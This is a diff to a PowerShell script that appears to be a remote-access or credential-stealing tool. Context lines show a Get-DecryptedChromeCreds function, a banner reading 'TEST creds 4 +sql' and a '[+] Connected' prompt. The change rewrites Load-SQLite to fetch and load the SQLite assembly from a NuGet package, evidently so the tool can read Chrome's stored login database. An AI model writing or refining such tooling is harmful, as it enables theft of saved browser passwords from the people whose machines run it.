@@ -398,22 +398,42 @@ function PortSuggest {
 
  function Load-SQLite {
     $dllPath = "$env:TEMP\System.Data.SQLite.dll"
-    $url = "https://github.com/LevVedrov/files/raw/main/System.Data.SQLite.dll"
-
-    if (-not (Test-Path $dllPath)) {
-        Output-Log "[*] Downloading SQLite assembly..."
-        Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
-    }
+    $nupkgUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.113.6"
+    $zipPath = "$env:TEMP\sqlite_nuget.zip"
+    $extractPath = "$env:TEMP\sqlite_nupkg"
 
     try {
-        Add-Type -Path $dllPath
-        Output-Log "[+] SQLite DLL loaded from: $dllPath"
+        Output-Log "[*] Downloading SQLite .nupkg from NuGet..."
+        Invoke-WebRequest -Uri $nupkgUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+
+        Output-Log "[*] Extracting .nupkg..."
+        if (Test-Path $extractPath) {
+            Remove-Item -Path $extractPath -Recurse -Force
+        }
+        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+
+        # Ищем DLL в папках lib/net40/ или lib/net462/
+        $foundDll = Get-ChildItem -Path "$extractPath\lib" -Recurse -Filter "System.Data.SQLite.dll" |
+                    Where-Object { $_.FullName -like "*net4*" } |
+                    Select-Object -First 1
+
+        if (-not $foundDll) {
+            return "[ERROR] SQLite DLL not found in .nupkg package."
+        }
+
+        Copy-Item $foundDll.FullName -Destination $dllPath -Force
+        Add-Type -Path $dllPath -ErrorAction Stop
+
+        Output-Log "[+] Loaded SQLite from NuGet package."
         return $true
     } catch {
-        Output-Log "[ERROR] Failed to load SQLite: $($_.Exception.Message)"
-        return $false
+        return "[ERROR] Load-SQLite failed: $($_.Exception.Message)"
+    } finally {
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+        Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
     }
 }
+
 
 function Get-DecryptedChromeCreds {
     Add-Type -AssemblyName System.Security
@@ -710,7 +730,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 2 +sql
+                                            TEST creds 4 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
